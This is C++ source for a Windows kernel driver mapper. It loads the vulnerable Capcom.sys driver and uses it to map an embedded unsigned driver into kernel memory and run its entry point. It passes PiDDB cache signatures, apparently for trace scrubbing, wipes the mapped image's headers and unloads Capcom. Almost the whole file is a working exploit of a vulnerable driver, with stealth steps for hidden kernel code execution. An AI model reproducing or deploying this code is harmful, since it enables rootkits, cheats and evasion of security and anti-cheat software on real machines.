#include <cstdio>
#include <Windows.h>
#include <Psapi.h>
#include "map/drv_image.hpp"
#include "map/util.hpp"
#include "map/capcom.hpp"
#include "map/structs.hpp"
#include "map/loader.hpp"
#include "map/capcomsys.hpp"
#include "map/ExcDriver.h"
#include <cassert>
#pragma comment(lib, "capcom.lib")
#pragma comment(lib, "drvmap.lib")


constexpr auto page_size = 0x1000u;
UCHAR PiDDBLockPtr_sig[16] = "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x8C";
UCHAR PiDDBCacheTablePtr_sig[7] = "\x66\x03\xD2\x48\x8D\x0D";
ULONG TimeDateStamp = 0x57CD1415;

typedef enum _WIN10_VER
{
	WIN10_1803 = 17134,
	WIN10_1809 = 17763,
	WIN10_1903 = 18362,
	WIN10_1909 = 18363
} WIN10_VER;

static WIN10_VER get_windows_version()
{
	HKEY h_key;
	DWORD size;
	CHAR* str;
	LPDWORD lpType = NULL;
	WIN10_VER version;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, KEY_READ, &h_key);
	RegQueryValueEx(h_key, "CurrentBuildNumber", NULL, lpType, NULL, &size); //get size
	str = new CHAR[size]; // times 2 since we are dealing with 16 bit unicode (2 bytes for WCHAR)
	RegQueryValueEx(h_key, "CurrentBuildNumber", NULL, lpType, (LPBYTE)str, &size);
	RegCloseKey(h_key);

	version = (WIN10_VER)strtol(
		(const char*)str,
		(char**)str[size - 1],
		10
	);

	delete[] str;
	return version;
}

static BOOL Np_TryIncreaseWorkingSetSize(SIZE_T Size)
{
	SIZE_T Min, Max;
	if (!GetProcessWorkingSetSize((HANDLE)-1, &Min, &Max))
		return FALSE;
	if (!SetProcessWorkingSetSize((HANDLE)-1, Min + Size, Max + Size))
		return FALSE;
	return TRUE;
}

int __stdcall map()
{
	HMODULE cpaddr = GetModuleHandleA(0);
	printf("[+] got module handle 0x%p", cpaddr);
	MODULEINFO mi;
	if (!GetModuleInformation((HANDLE)-1, cpaddr, &mi, sizeof(mi)))
	{
		printf("[-] GetModuleInformation failed");
		return 0;
	}
	if (!Np_TryIncreaseWorkingSetSize(mi.SizeOfImage))
	{
		printf("[-] Np_TryIncreaseWorkingSetSize failed");
		return 0;
	}
	if (!VirtualLock(cpaddr, mi.SizeOfImage))
	{
		printf("[-] VirtualLock failed");
		return 0;
	}
	printf("[+] Locked all memory");

	bool capcomload = loader::load_vuln_driver((uint8_t*)capcom_sys, sizeof(capcom_sys), L"C:\\Windows\\Capcom.sys", L"Capcom");
	printf("[+] loaded capcom driver: %i\n", capcomload);

	const auto capcom = std::make_unique<capcom::capcom_driver>();

	const auto _get_module = [&capcom](std::string_view name)
	{
		return capcom->get_kernel_module(name);
	};

	const auto _get_export_name = [&capcom](uintptr_t base, const char* name)
	{
		return capcom->get_export(base, name);
	};

	const std::function<uintptr_t(uintptr_t, uint16_t)> _get_export_ordinal = [&capcom](uintptr_t base, uint16_t ord)
	{
		return capcom->get_export(base, ord);
	};
	sizeof(SYSTEM_INFORMATION_CLASS::SystemBasicInformation);
	std::vector<uint8_t> driver_image(sizeof(ExcDrv));
	memcpy(driver_image.data(), ExcDrv, sizeof(ExcDrv));
	drvmap::drv_image driver(driver_image);

	const auto kernel_memory = capcom->allocate_pool(driver.size(), 'LOOB', kernel::NonPagedPool, true);

	assert(kernel_memory != 0);

	printf("[+] allocated 0x%llX bytes at 0x%I64X\n", driver.size(), kernel_memory);

	driver.fix_imports(_get_module, _get_export_name, _get_export_ordinal);

	printf("[+] imports fixed\n");

	driver.map();

	printf("[+] sections mapped in memory\n");

	driver.relocate(kernel_memory);

	printf("[+] relocations fixed\n");

	const auto _RtlCopyMemory = capcom->get_system_routine<drvmap::structs::RtlCopyMemoryFn>(L"RtlCopyMemory");

	const auto size = driver.size();
	const auto source = driver.data();
	const auto entry_point = kernel_memory + driver.entry_point();

	capcom->run([&kernel_memory, &source, &size, &_RtlCopyMemory](auto get_mm)
		{
			_RtlCopyMemory((void*)kernel_memory, source, size);
		});

	printf("[+] calling entry point at 0x%I64X\n", entry_point);
	//L"dxgkrnl.sys", "NtDxgkGetProcessList" 1803
	LPCWSTR HookedDriver{};
	LPCSTR HookedFunction{};

	/*switch (get_windows_version())
	{
	case WIN10_1803:
		HookedDriver = L"dxgkrnl.sys";
		HookedFunction = "NtDxgkGetProcessList";
		break;
	case WIN10_1809:
		break;
	case WIN10_1903:
		break;
	case WIN10_1909:
		break;
	}

	if (!HookedDriver || !HookedFunction)
		return -1;*/

	auto status = STATUS_SUCCESS;
	const auto capcom_base = capcom->get_kernel_module("Capcom");
	capcom->run([&entry_point, &status, &kernel_memory, &capcom_base](auto mm_get) {
		using namespace drvmap::structs;
		status =
			((PDRIVER_INITIALIZE)entry_point)(
				kernel_memory,
				'LOOB',
				PiDDBLockPtr_sig,
				PiDDBCacheTablePtr_sig,
				TimeDateStamp,
				(unsigned short*)L"capcom.sys"
				);
		});

	if (NT_SUCCESS(status))
	{
		printf("[+] successfully created driver object!\n");

		const auto _RtlZeroMemory = capcom->get_system_routine<drvmap::structs::RtlZeroMemoryFn>(L"RtlZeroMemory");
		const auto header_size = driver.header_size();

		capcom->run([&_RtlZeroMemory, &kernel_memory, &header_size](auto mm_get) {
			_RtlZeroMemory((void*)kernel_memory, header_size);
			});

		printf("[+] wiped headers!\n");
	}
	else
	{
		printf("[-] creating of driver object failed! 0x%I32X\n", status);

	}

	capcom->close_driver_handle();
	capcomload = loader::unload_vuln_driver("C:\\Windows\\Capcom.sys", L"Capcom");
	printf("[+] unloaded capcom driver: %i\n", capcomload);

	if (!VirtualUnlock(cpaddr, mi.SizeOfImage))
	{
		printf("[-] VirtualLock failed");
		return 0;
	}
	printf("[+] Unlocked all memory");

	return 0;
}